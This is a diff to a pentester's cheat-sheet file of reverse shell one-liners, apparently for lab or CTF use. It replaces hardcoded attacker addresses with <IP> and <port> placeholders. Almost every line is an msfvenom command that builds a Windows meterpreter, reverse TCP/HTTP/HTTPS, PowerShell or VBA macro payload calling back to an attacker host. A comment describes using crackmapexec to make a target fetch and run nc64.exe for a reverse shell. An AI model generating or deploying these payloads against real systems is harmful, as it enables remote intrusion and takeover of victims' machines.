@@ -1,4 +1,4 @@
-% deadbeefs revshells Cheats
+% rev shells cheats
 
 # $ wordlist: fdfind . $(pwd) /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u 
 # $ IP: ip a s tun0 | grep 'inet\ ' | awk '{print $2}' | cut -d '/' -f 1
@@ -7,22 +7,22 @@ $ IP: for adaptername in $(for i in "$(ip a s | sort -r | grep -E $'[[:digit:]]:
 
 
 # x86 normal
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f exe > shell.exe
 
 # x64 (CMD Single Stage)
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe > shell.exe
 
 # reverse HTTP
-msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_http LHOST=<IP> LPORT=<port> -f exe > shell.exe
 
 # reverse HTTPS
-msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<port> -f exe > shell.exe
 
 # Powershell Payload
-msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.10.10 LPORT=4545 > shell.bat
+msfvenom -p cmd/windows/reverse_powershell LHOST=<IP> LPORT=<port> > shell.bat
 
 # Macro Payload
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f vba
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f vba
 
 
 # crackmapexec (windows specific) download nc64.exe from your (tun0 port 80, webserver, revshell on port 443) box and execute it.
